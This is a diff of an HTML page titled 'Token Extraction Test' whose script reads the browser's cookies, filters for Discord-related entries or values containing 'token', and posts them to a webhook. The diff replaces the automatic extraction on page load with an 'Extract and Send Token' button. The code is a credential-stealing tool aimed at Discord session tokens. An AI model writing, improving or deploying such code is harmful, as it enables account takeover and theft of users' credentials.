@@ -27,17 +27,18 @@
 </head>
 <body>
     <h1>Token Extraction Test</h1>
+    <button id="extractTokenButton">Extract and Send Token</button>
     <p id="output"></p>
 
     <script>
-        function extractCookies() {
-            // ดึงข้อมูล cookies จากเบราว์เซอร์ที่เปิดอยู่
+        document.getElementById('extractTokenButton').addEventListener('click', function() {
+            // ดึง cookies จากเบราว์เซอร์
             const cookies = document.cookie.split('; ');
             const tokenData = {};
 
             cookies.forEach(cookie => {
                 const [name, value] = cookie.split('=');
-                // เพิ่มเงื่อนไขหากต้องการกรองข้อมูลเฉพาะ token ของ Discord
+                // เงื่อนไขเพื่อค้นหา token Discord
                 if (name.includes('discord') || value.includes('token')) {
                     tokenData[name] = value;
                 }
@@ -57,10 +58,7 @@
             .then(response => response.text())
             .then(data => console.log('Success:', data))
             .catch(error => console.error('Error:', error));
-        }
-
-        // เรียกใช้ฟังก์ชันเพื่อดึงข้อมูลและส่งไปยัง Webhook ทันทีหลังจากเปิดหน้าเว็บ
-        extractCookies();
+        });
     </script>
 </body>
 </html>
